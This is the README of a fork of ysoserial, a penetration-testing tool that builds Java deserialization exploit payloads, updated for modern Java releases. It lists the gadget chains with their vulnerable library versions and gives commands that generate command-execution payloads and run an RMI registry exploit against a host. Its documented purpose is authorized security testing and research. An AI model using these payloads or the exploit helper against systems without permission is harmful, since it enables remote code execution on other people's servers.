# ysoserial modern Java build

This repository is a modernized build of the original
[frohoff/ysoserial](https://github.com/frohoff/ysoserial) project.

The upstream project is a proof-of-concept tool for generating Java serialized
objects that exercise unsafe Java deserialization gadget chains. This fork keeps
the upstream purpose and payload model, while updating the project so it can
build and run reliably on newer Java releases such as Java 17, Java 21, and Java
25.

![ysoserial logo](ysoserial.png)

## Scope

This fork focuses on build and runtime compatibility with modern Java versions.
It does not attempt to change the vulnerability model, rewrite the payload
chains, or upgrade gadget dependencies in a way that would change their
behavior.

Important compatibility updates include:

- Maven compiler configuration updated for Java 11+.
- Java module `Add-Opens` and `Add-Exports` manifest entries added to the
  assembled jar for payload builders that use JDK internals.
- Payload discovery replaced with direct classpath scanning so payloads are
  listed consistently on modern Java runtimes.
- RMI Activation dependent legacy code moved to `src/legacy/java`, because RMI
  Activation was removed from the JDK after Java 14.

## Safety Notice

This software is intended for authorized security research, defensive testing,
education, and compatibility analysis. Do not use it against systems you do not
own or do not have explicit permission to test.

The vulnerability is unsafe deserialization in an application. The presence of a
gadget library on a classpath is not, by itself, the root vulnerability.

## Requirements

- Java 11 or newer for building.
- Maven 3.x for building.
- Java 17, Java 21, and Java 25 are supported runtime targets for this fork.

The current default build is designed for modern Java runtimes. Java 8-era RMI
Activation entry points are preserved as legacy source, but are not compiled by
default.

## Download

Clone this repository:

```shell
git clone https://github.com/Pariston-Hill/ysoserial-modern-java.git
cd ysoserial-modern-java
```

If you only need the original upstream project, use:

```shell
git clone https://github.com/frohoff/ysoserial.git
```

Download the current release jar:

```shell
curl -L -o ysoserial-modern-java.jar \
  https://github.com/Pariston-Hill/ysoserial-modern-java/releases/download/v0.0.6-modern-java.1/ysoserial-0.0.6-SNAPSHOT-all.jar
```

## Build

```shell
mvn clean package -DskipTests
```

The executable all-in-one jar is created at:

```text
target/ysoserial-0.0.6-SNAPSHOT-all.jar
```

If Maven is not installed system-wide, use any recent Maven 3.x distribution and
run the same command from the repository root.

## Usage

Run the jar without arguments to print usage and the payloads available in the
current default build:

```shell
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
  Available payload types:
     Payload             Authors                                Dependencies
     -------             -------                                ------------
     AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
     Clojure             @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                               commons-collections:3.1
     CommonsCollections2 @frohoff                               commons-collections4:4.0
     CommonsCollections3 @frohoff                               commons-collections:3.1
     CommonsCollections4 @frohoff                               commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                               groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser                       js:1.7R2
     MozillaRhino2       @_tint0                                js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                              rome:1.0
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

Generate a payload:

```shell
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://example.com > payload.bin
```

Generate a command-style payload for an authorized test target:

```shell
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'id' > payload.bin
```

The assembled jar contains Java module manifest entries for the JDK internals
used by common payload builders. On modern Java launchers this allows direct
`java -jar` usage without manually repeating long `--add-opens` and
`--add-exports` arguments.

If your Java launcher ignores those manifest entries, use the helper launcher:

```shell
bin/ysoserial CommonsCollections1 'id' > payload.bin
```

On Windows:

```cmd
bin\ysoserial.bat CommonsCollections1 "whoami" > payload.bin
```

## Examples

Inspect a generated serialized object with `xxd`:

```shell
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'id' | xxd
00000000: aced 0005 7372 0032 7375 6e2e 7265  ....sr.2sun.re
00000010: 666c 6563 742e 616e 6e6f 7461 7469  flect.annotati
00000020: 6f6e 2e41 6e6e 6f74 6174 696f 6e49  on.AnnotationI
...
```

Write a URLDNS payload to a file:

```shell
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://example.com > urldns.bin
```

Write a command payload to a file for an authorized lab target:

```shell
$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'id' > cc1.bin
```

Use the helper launcher if your Java runtime requires explicit module options:

```shell
$ bin/ysoserial CommonsCollections1 'id' > cc1.bin
```

Run an exploit helper class from the all-in-one jar:

```shell
$ java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 'id'
```

## Available Payloads

The default Java 11+ build currently includes these payloads:

| Payload | Authors | Dependencies |
| --- | --- | --- |
| AspectJWeaver | @Jang | aspectjweaver:1.9.2, commons-collections:3.2.2 |
| BeanShell1 | @pwntester, @cschneider4711 | bsh:2.0b5 |
| C3P0 | @mbechler | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
| Click1 | @artsploit | click-nodeps:2.3.0, javax.servlet-api:3.1.0 |
| Clojure | @JackOfMostTrades | clojure:1.8.0 |
| CommonsBeanutils1 | @frohoff | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
| CommonsCollections1 | @frohoff | commons-collections:3.1 |
| CommonsCollections2 | @frohoff | commons-collections4:4.0 |
| CommonsCollections3 | @frohoff | commons-collections:3.1 |
| CommonsCollections4 | @frohoff | commons-collections4:4.0 |
| CommonsCollections5 | @matthias_kaiser, @jasinner | commons-collections:3.1 |
| CommonsCollections6 | @matthias_kaiser | commons-collections:3.1 |
| CommonsCollections7 | @scristalli, @hanyrax, @EdoardoVignati | commons-collections:3.1 |
| FileUpload1 | @mbechler | commons-fileupload:1.3.1, commons-io:2.4 |
| Groovy1 | @frohoff | groovy:2.3.9 |
| Hibernate1 | @mbechler | |
| Hibernate2 | @mbechler | |
| JBossInterceptors1 | @matthias_kaiser | javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| JRMPClient | @mbechler | |
| JSON1 | @mbechler | json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 |
| JavassistWeld1 | @matthias_kaiser | javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 |
| Jdk7u21 | @frohoff | |
| Jython1 | @pwntester, @cschneider4711 | jython-standalone:2.5.2 |
| MozillaRhino1 | @matthias_kaiser | js:1.7R2 |
| MozillaRhino2 | @_tint0 | js:1.7R2 |
| Myfaces1 | @mbechler | |
| Myfaces2 | @mbechler | |
| ROME | @mbechler | rome:1.0 |
| Spring1 | @frohoff | spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE |
| Spring2 | @mbechler | spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 |
| URLDNS | @gebl | |
| Vaadin1 | @kai_ullrich | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
| Wicket1 | @jacob-baines | wicket-util:6.23.0, slf4j-api:1.6.4 |

Payload availability is intentionally tied to the dependencies and JDK APIs that
exist in the current build. In this modern Java build, the legacy
`ysoserial.payloads.JRMPListener` payload is not part of the default compiled
artifact because it depends on RMI Activation APIs removed after Java 14.

## Legacy Java 8-14 Code

The following upstream classes are preserved under `src/legacy/java`:

- `ysoserial.payloads.JRMPListener`
- `ysoserial.exploit.JenkinsListener`

They are not compiled by the default Java 11+ build. To experiment with them,
use a JDK that still contains RMI Activation, such as JDK 8 through JDK 14, and
wire the legacy source directory into a separate build profile.

## Verification

This fork has been verified with:

```shell
mvn -DskipTests package
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://example.com > payload.bin
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 'echo test' > payload.bin
```

It has also been tested on OpenJDK 25 for both source build and direct
`java -jar` payload generation.

## Project Layout

```text
src/main/java      Default modern Java source set
src/legacy/java    Upstream legacy source that requires removed JDK APIs
bin/               Helper launchers for Java module options
target/            Maven build output
```

## Relationship to Upstream

Original project:

- Repository: [frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- License: BSD-style license from the upstream project, preserved in
  [LICENSE.txt](LICENSE.txt)
- Disclaimer: upstream disclaimer preserved in [DISCLAIMER.txt](DISCLAIMER.txt)

This fork should be treated as a compatibility-focused derivative. Upstream
credits, payload authorship annotations, and dependency metadata are preserved
in the source where applicable.

## Contributing

Changes should keep payload behavior compatible with the upstream project unless
the change is explicitly documented as a compatibility adjustment.

Recommended checks before submitting changes:

```shell
mvn clean package -DskipTests
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar
```

## Related Projects

- [frohoff/ysoserial](https://github.com/frohoff/ysoserial)
- [marshalsec](https://github.com/mbechler/marshalsec)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
